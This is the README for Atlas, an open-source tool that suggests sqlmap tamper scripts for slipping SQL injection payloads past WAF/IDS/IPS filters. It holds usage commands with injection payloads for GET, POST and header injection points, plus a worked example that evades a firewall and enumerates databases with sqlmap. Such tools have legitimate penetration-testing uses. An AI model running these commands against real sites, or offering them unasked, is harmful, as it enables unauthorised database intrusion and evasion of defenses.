Atlas - Quick SQLMap Tamper Suggester v1.0
---

__Atlas__ is an open source tool that can suggest sqlmap tampers to bypass WAF/IDS/IPS, the tool is based on returned status code.

![atlas_main](https://i.imgur.com/G2bXF3A.png)


Screen
---
![atlas_run](https://i.imgur.com/I6cXSKd.png)

Installation
---
```
$ git clone https://github.com/m4ll0k/Atlas.git atlas
$ cd atlas
$ pip3 install -r requirements.txt
$ python atlas.py # python3+
```

Usage
---
```
$ python atlas.py --url http://site.com/index.php?id=Price_ASC --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

injection point (with `%%inject%%`):

get:
```
$ python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

post:
```
$ python atlas.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```

headers:
```
$ python atlas.py --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
```


tampers concatenation:

```
$ python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
```

get tampers list:

```
$ python atlas.py -g
```


Example 
---
1. Run SQLMap:
```
$ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3
```
![sqlmap](https://i.imgur.com/XP39Rqz.png)

```Price_ASC') AND 8716=4837 AND ('yajr'='yajr``` is blocked by WAF/IDS/IPS, now trying with Atlas:
```
$ python atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
```
![atlas_succ](https://i.imgur.com/U6qEnXp.png)

At this point:

```
$ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords,...
```

#### The new Update get will soon stay updated
$ BurpSuite
